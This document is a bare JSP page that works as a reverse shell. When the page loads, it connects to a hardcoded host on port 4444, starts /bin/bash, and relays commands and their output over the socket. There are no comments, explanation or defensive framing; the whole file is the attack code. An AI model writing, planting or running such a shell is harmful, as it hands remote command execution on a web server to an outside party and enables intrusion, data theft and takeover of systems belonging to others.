<%@ page import="java.io.*,java.net.*" %>
<%
String ip = "10.0.5.12";
int port = 4444;

Socket s = new Socket(ip, port);
BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));
PrintWriter writer = new PrintWriter(s.getOutputStream(), true);

Process p = Runtime.getRuntime().exec("/bin/bash");
BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
PrintWriter stdin = new PrintWriter(p.getOutputStream(), true);

String line;
while ((line = reader.readLine()) != null) {
    stdin.println(line);
    stdin.flush();
   
    while ((line = stdInput.readLine()) != null) {
        writer.println(line);
        writer.flush();
    }
    while ((line = stdError.readLine()) != null) {
        writer.println(line);
        writer.flush();
    }
}

s.close();
p.destroy();
%>
